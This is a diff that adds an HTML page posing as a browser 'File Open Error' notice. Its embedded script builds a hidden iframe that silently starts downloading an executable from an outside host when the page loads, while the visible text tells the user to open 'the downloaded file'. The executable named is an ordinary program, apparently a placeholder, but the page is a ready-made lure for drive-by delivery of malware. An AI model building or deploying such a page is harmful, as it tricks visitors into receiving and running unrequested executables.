@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>File Open Error</title> 
+  <style>
+    body {
+      background-color: #cccccc;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    b {
+      font-family: 'Arial', sans-serif;
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <b>Your browser could not load this document.<br/>Please check the downloaded file.</b>
+
+    <script>
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe'; // The remote file to download
+      document.body.appendChild(iframe);
+    </script>
+  </div>
+</body>
+</html>
